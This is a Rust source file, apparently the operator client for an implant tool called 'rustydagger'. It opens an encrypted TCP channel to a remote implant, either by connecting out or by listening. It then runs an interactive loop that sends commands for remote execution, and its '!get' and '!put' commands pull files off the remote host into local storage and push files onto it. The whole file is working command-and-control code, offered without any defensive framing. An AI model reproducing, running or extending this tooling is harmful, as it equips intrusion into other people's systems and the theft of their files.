extern crate libc;
extern crate getopts;
extern crate chrono;
extern crate rustydagger;

use std::*;
use getopts::Options;
use std::io::{ BufRead, Write, Read };
use std::fs::{ File, OpenOptions };
use std::process::exit;
use chrono::*;
use rustydagger::communication::*;
use rustydagger::data_mod::encryption;
use rustydagger::handler::*;
//5MB buffer based on 1024 * 1024 * 5
//Arbitrary number, but this tools isn't designed for sending
//and receiving large amounts of data.  Trying to keep it small
//to minimize the memory footprint and allow it to scale to a large
//number of connections on a single host.
const NET_BUFF: usize = 1024 * 1024 * 5;

fn main() {

    //Get IP, port, and mode from command line arguments
    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();
    let mut opts = Options::new();
    opts.optflag("h", "help", "Print implant usage statement");
    opts.optopt("l", "listen", "Tell client to bind to this IP address", "LOCAL_IP");
    opts.optopt("c", "connect", "Tell client to connect to this IP address", "REMOTE_IP");
    opts.optopt("p", "port", "Port used for binding or connecting", "PORT");
    let matches = match opts.parse(&args[1..]) {
        Ok(m) => { m }
        Err(err) => { panic!(err.to_string()) }
    };
    if matches.opt_present("h") {
        print_usage(&program, opts);
        return;
    }
    if matches.opt_present("c") && matches.opt_present("l") {
        print_usage(&program, opts);
        return;
    }
    if (matches.opt_present("c") == false) && (matches.opt_present("l") == false) {
            print_usage(&program, opts);
            return;
    }
    let communication_port = if matches.opt_present("p") {
        match matches.opt_str("p").unwrap().parse::<u16>() {
            Ok(port) => port,
            Err(err) => panic!("Couldn't parse port value {:?}", err),
        }
    } else {
        print_usage(&program, opts);
        return;
    };
    let communication_ip = if matches.opt_present("c") {
        match matches.opt_str("c").unwrap().parse::<net::Ipv4Addr>() {
            Ok(ip) => ip,
            Err(err) => panic!("{:?}", err),
        }
    } else if matches.opt_present("l") {
        match matches.opt_str("l").unwrap().parse::<net::Ipv4Addr>() {
            Ok(ip) => ip,
            Err(err) => panic!("{:?}", err),
        }
    } else {
        print_usage(&program, opts);
        return;
    };

    //Create SocketAddrV4 using the IP and port parsed above
    let communication_socket = net::SocketAddrV4::new(communication_ip, communication_port);
    
    //Connect, or bind, to IP and port parsed above
    let communication_stream = if matches.opt_present("c") {
        match net::TcpStream::connect(communication_socket) {
            Ok(connection) => connection,
            Err(err) => panic!("{:?}", err),
        }
    } else if matches.opt_present("l") {
        match net::TcpListener::bind(communication_socket).unwrap().accept() {
            Ok(connection) => connection.0,
            Err(err) => panic!("{:?}", err),
        }
    } else {
        panic!("You should never see this message");
    };

    //Create buffer to hold command line input
    let mut command_string = String::new();
    let mut tcp_session = tcp_connection::create(communication_stream, NET_BUFF);
    let mut keyring = encryption::create_keyring();
    encryption::send_pubkey(&mut tcp_session, &keyring);
    tcp_session.recv();//Receive public key from server
    encryption::gen_sharedkey(&tcp_session.input_buffer, &mut keyring);
    encryption::send_iv(&mut tcp_session, &mut keyring);
    let mut encrypted_session = encrypted_tcp::create(tcp_session, keyring);
    //Main command loop
    loop {
        command_string.clear();
        io::stdout().write(b"Enter Command:").unwrap();
        io::stdout().flush().unwrap();
        let stdin = io::stdin();
        stdin.lock().read_line(&mut command_string).unwrap();
        if command_string.starts_with("\n") {
            continue
        }//rustydagger is fine with this, but it makes us send unnecessary traffic.
        if command_string.starts_with("!") {
            match special_cmd(&mut encrypted_session, &mut command_string) {
                Ok(_) => continue,
                Err(err) => {
                    println!("{}", err.to_string());
                    continue
                },
            }
        } else {
            execute::client_run(&mut encrypted_session, &command_string);
            io::stdout().write(str::from_utf8(&encrypted_session.tcp_session.input_buffer)
                               .unwrap()
                               .as_bytes())
                        .unwrap();
            io::stdout()
                .flush()
                .unwrap();
        }
    }
}   

fn print_usage(program: &str, opts: Options) {
        let brief = format!("Usage: {} FILE [options]", program);
            print!("{}", opts.usage(&brief));
}

fn make_storage(to_retrieve: &str) -> Result<fs::File, io::Error> {
    let mut storage_dir = String::new();
    storage_dir.push_str("/storage");
    let mut dir_split: Vec<&str> = to_retrieve.split('/').collect();
    let mut storage_file = String::new();
    storage_file.push_str(dir_split.last().unwrap());
    dir_split.pop();
    for dir in &dir_split {
        storage_dir.push_str(dir);
        storage_dir.push_str("/");
    }
    try!(fs::create_dir_all(&storage_dir));
    storage_dir.push_str("/");
    storage_dir.push_str(&storage_file);
    storage_dir.push_str(".");
    let timestamp: DateTime<UTC> = UTC::now();
    storage_dir.push_str(&timestamp.timestamp().to_string());
    let file = OpenOptions::new().read(true).write(true).create(true).open(storage_dir).unwrap();
    Ok(file)
}

fn special_cmd(encrypted_session: &mut encrypted_tcp::EncryptedSession, command_string: &mut String) -> Result<(), io::Error> {
    if command_string == "!exit\n" {
        quit::client_run(encrypted_session);
        exit(0);
    } else if command_string.starts_with("!get") {
        let to_retrieve: Vec<&str> = command_string.split_whitespace().collect();
        if to_retrieve.len() != 2 {
            println!("Usage: !get <remote_file>");
            return Ok(()) 
        }
        let mut storage_file = try!(make_storage(&to_retrieve[1]));
        try!(get::client_run(&mut storage_file, encrypted_session, &to_retrieve[1]));
    } else if command_string.starts_with("!put") {
        let put_options: Vec<&str> = command_string.split_whitespace().collect();
        if put_options.len() != 3 {
            println!("Usage: !put <local_file> <remote_file>");
            return Ok(())
        }
        let mut local_file = try!(File::open(put_options[1]));
        put::client_run(&mut local_file, encrypted_session, &put_options[2]);
    } else {
        println!("Unknown command: {}", command_string);
    }
    Ok(())
}
